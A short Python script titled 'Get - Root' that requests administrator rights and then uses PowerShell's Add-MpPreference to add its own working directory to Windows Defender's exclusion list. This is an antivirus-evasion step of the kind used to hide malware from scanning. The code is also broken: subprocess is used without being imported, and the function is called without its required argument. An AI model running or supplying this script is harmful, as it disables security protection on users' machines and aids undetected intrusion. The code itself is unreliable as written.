#! /usr/bin/python3

import os, ctypes
import platform, time
from elevate import elevate
import pyfiglet, termcolor

banner = "Get - Root"
print(termcolor.colored(pyfiglet.figlet_format(banner), color="red", attrs=["bold"]))

elevate()

def exclude_path_antivirus(dir_to_add):
    dir_to_add = os.getcwd()
    all_commands = ["powershell.exe"]
    command = "Add-MpPreference -ExclusionPath " + dir_to_add
    all_commands.append(command)

    process = subprocess.run(all_commands, shell=True, capture_output=True, stdin=subprocess.DEVNULL)
    output = process.stderr.decode()

    # print(output)
    if output == "":
        print(process.stdout.decode())
        print(termcolor.colored("[+] Added path to exclusion : ", color="green", attrs=["bold"]), end="")
        print(termcolor.colored(dir_to_add, color="white", attrs=["bold"]))
        msg = process.stdout.decode()

    else:
        print(process.stderr.decode())
        print(termcolor.colored("[-] Couldn't add to exclusion : ", color="red", attrs=["bold"]), end="")
        print(termcolor.colored(dir_to_add, color="white", attrs=["bold"]))
        msg = process.stderr.decode() + str(dir_to_add)

    return msg

print(termcolor.colored("[*] Before!", color="yellow", attrs=["bold"]))
time.sleep(13)

print(exclude_path_antivirus())
print()

time.sleep(100)

